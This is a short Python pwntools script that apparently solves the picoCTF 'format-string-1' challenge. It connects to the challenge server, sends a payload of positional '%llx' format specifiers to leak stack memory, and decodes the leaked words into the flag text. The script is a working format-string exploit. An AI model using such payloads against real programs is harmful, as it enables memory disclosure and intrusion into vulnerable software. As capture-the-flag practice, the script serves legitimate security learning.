import pwn

pwn.context.terminal = ['tmux', 'splitw', '-h']

# p = pwn.process("format-string-1")
p = pwn.remote("mimas.picoctf.net", 59891)
p.recvuntil(b"Give me your order and I'll read it back to you:\n")

# _, io_gdb = pwn.gdb.attach(p, '''
#     break printf
#     continue
# ''', api=True)

index = (0x7fffcc95c338 - 0x7fffcc95c2f8) // 0x08 + 6
payload = b""
for i in range(index, index + 8):
    payload += f"%{i}$llx_".encode()
p.sendline(payload)
# io_gdb.wait()
# io_gdb.continue_and_wait()
# io_gdb.execute("context")

p.recvuntil(b"Here's your order: ")
line = p.recvline()
line = line.strip()
elements = line.split(b"_")[:-1]
result = ""
for e in elements:
    n = int(e.decode(), 16)
    hex_n = n.to_bytes((n.bit_length() + 7) // 8, byteorder='little')
    # print(hex_n)
    s = hex_n.decode("ascii", errors='replace')
    result += s

print(result)

p.interactive()
